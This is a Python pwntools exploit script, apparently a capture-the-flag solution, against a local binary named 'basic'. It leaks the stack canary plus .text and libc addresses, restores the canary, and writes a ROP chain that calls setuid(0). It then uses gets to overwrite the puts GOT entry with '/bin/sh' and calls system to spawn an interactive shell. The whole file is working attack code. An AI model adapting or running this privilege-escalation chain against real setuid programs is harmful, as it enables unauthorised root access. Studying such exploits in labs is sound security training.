#!/bin/python3

from pwn import *

# offsets from __libc_csu_init__
PUTS_GOT_OSET = 0x2c08 
POP_RDI       = 0x63

# offsets from return address
SYS_OSET    = 0x222bb
READ_OSET   = 0xc7d2b
GETS_OSET   = 0x4e50b
EXIT_OSET   = 0x17b0b
SETUID_OSET = 0xa4e2b

# convert to int, add offset, then convert back
add_oset = lambda addr, oset: bytes(hex(int(addr, 16) + oset)[2:], "ASCII")

def main():

    # start process
    t = process("./basic")
    
    # print 20 lines of main stack
    t.sendline(b"20")
    
    # get canary
    t.recvuntil(b"[13] = 0x")
    canary = t.recvuntil(b"\n")
    
    log.success(f"canary           : 0x{canary.decode()}\n")
    
    # get .text leak
    t.recvuntil(b"[15] = 0x")
    csu_init = t.recvuntil(b"\n")
    
    pop_rdi  = add_oset(csu_init, POP_RDI)
    puts_got = add_oset(csu_init, PUTS_GOT_OSET)
    
    log.success(f"csu_init (.text) : 0x{csu_init.decode()}")
    log.info(f"    pop rdi      : 0x{pop_rdi.decode()}")
    log.info(f"    puts got     : 0x{puts_got.decode()}\n\n")
    
    # get libc leak from return address
    t.recvuntil(b"[17] = 0x")
    leak = t.recvuntil(b"\n")
    
    sys    = add_oset(leak, SYS_OSET)
    gets   = add_oset(leak, GETS_OSET)
    brexit = add_oset(leak, EXIT_OSET)
    setuid = add_oset(leak, SETUID_OSET)
    
    log.success(f"main ret (libc)  : 0x{leak.decode()}")
    log.info(f"   read          : 0x{add_oset(leak, READ_OSET).decode()}")
    log.info(f"   sys           : 0x{sys.decode()}")
    log.info(f"   gets          : 0x{gets.decode()}")
    log.info(f"   setuid        : 0x{setuid.decode()}")
    log.info(f"   exit          : 0x{brexit.decode()}\n\n")
    
    # skip until canary 
    while b"[13] = 0x" not in t.recv(): t.sendline(b"0")
    
    # restore canary
    t.sendline(canary)
    
    # skip until return address
    while b"[17] = 0x" not in t.recv(): t.sendline(b"0")
    
    # create ROP chain
    t.sendline(pop_rdi)      # <--| rdi
    t.recv()                 #    |
    t.sendline(b"0")         # ---| 0x0
    t.recv()
    t.sendline(setuid)       # setuid(rdi)
    t.recv()
    t.sendline(pop_rdi)      # <--| rdi
    t.recv()                 #    |
    t.sendline(puts_got)     # ---| puts got address (the GOT is writable) 
    t.recv()
    t.sendline(gets)         # gets(rdi)
    t.recv()
    t.sendline(pop_rdi)      # <--| rdi                                      
    t.recv()                 #    |
    t.sendline(puts_got)     # ---| puts got address (gets does not preserve this register)
    t.recv()
    t.sendline(sys)          # system(rdi)
    t.recv()
    t.sendline(pop_rdi)      # <--| rdi                                      
    t.recv()                 #    |
    t.sendline(b"0")         # ---| EXIT_SUCCESS (0)
    t.recv()
    t.sendline(brexit)       # exit(rdi)
    t.recv()
    t.sendline(b"q")         # stop writing to stack
    t.recv()
    t.sendline(b"/bin/sh\0") # send /bin/sh to gets to write in GOT
    
    # shell
    t.interactive()

# call driver
if __name__ == "__main__":
    main()

